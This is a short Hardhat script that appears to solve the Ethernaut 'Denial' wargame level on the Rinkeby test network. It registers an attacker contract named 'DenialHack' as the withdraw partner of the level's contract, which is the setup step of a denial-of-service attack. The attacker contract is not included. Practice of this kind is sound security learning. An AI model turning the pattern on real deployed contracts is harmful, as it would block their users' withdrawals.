import { ethers } from "hardhat";

async function main(){

    // my rinkeby address
    let player = "0x87955711F08521Eb054f9354371eC38713f236ee";

    // Instance address
    let address_a = "0x64FAA19d951fD6A42BD3FF060225584D67730aC9";
    let address_b = "0x4b902A7D47F917f6F53A093Dc286483900b25814";

    let signer = await ethers.getSigner(player);
    let contract_a = await ethers.getContractAt("Denial", address_a, signer);
    let contract_b = await ethers.getContractAt("DenialHack", address_b, signer);

    let tx = await contract_a.setWithdrawPartner(address_b);
    await tx.wait();
    console.log(await contract_a.partner());
    


    

}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
